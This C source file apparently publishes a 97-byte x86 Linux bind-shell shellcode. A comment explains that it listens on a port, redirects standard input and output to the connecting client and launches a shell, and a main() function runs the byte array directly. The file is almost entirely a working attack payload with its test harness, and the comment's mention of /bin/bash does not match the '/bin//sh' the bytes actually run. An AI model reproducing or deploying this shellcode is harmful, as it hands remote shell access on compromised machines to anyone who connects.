/* nirosys <0xcd80>
 * 
 * Bindshell ShellCode.
 * Opens up a socket on the specified port,
 * and upon accept dup2's stdin/stdout/stderr
 * to the client socket's file descriptor.
 * After that, it execve's /bin/bash.
 */


/* 97 bytes */
/* Architecture: Intel 80386            */
char shellcode[] = {
        "\x31\xDB\xF7\xE3\x50\x43\x53\x6A\x02\x89\xE1\xB0\x66\xCD\x80"
        "\x66\xC7\x41\x02\xEF\xBE\x66\x89\x51\x04\x6A\x10\x51\x50\x89"
        "\xE1\x43\xB0\x66\xCD\x80\xB3\x04\x89\x59\x04\xB0\x66\xCD\x80"
        "\x89\x51\x04\x89\x51\x08\x43\xB0\x66\xCD\x80\x93\xB0\x3F\x87"
        "\xD1\xCD\x80\x41\xB0\x3F\xCD\x80\x41\xB0\x3F\xCD\x80\x31\xC0"
        "\x99\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50"
        "\x53\xB0\x0B\x89\xE1\xCD\x80"
};

int main( void ) {
    void (*foo)() = shellcode;

    printf("Shellcode Length = %d Bytes\n",strlen(shellcode));
    foo();

    return 0;
}
